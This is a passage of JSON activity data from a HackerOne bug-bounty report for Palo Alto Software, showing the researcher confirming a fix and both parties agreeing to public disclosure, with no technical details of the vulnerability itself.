feedback. I confirm that issue is fixed, do you agree to disclosure the report?","markdown_message":"\u003cp\u003e\u003ca href=\"/kad3nce\"\u003e@kad3nce\u003c/a\u003e thanks for the good feedback. I confirm that issue is fixed, do you agree to disclosure the report?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-13T13:13:33.036Z","updated_at":"2020-05-13T13:13:33.036Z","actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7989047,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T13:13:39.280Z","updated_at":"2020-05-13T13:13:39.280Z","first_to_agree":true,"actor":{"username":"macasun","cleared":false,"url":"/macasun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7993210,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T19:52:07.168Z","updated_at":"2020-05-13T19:52:07.168Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7993211,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-13T19:52:07.238Z","updated_at":"2020-05-13T19:52:07.238Z","actor":{"username":"kad3nce","cleared":false,"url":"/kad3nce","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"palo_alto_software","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}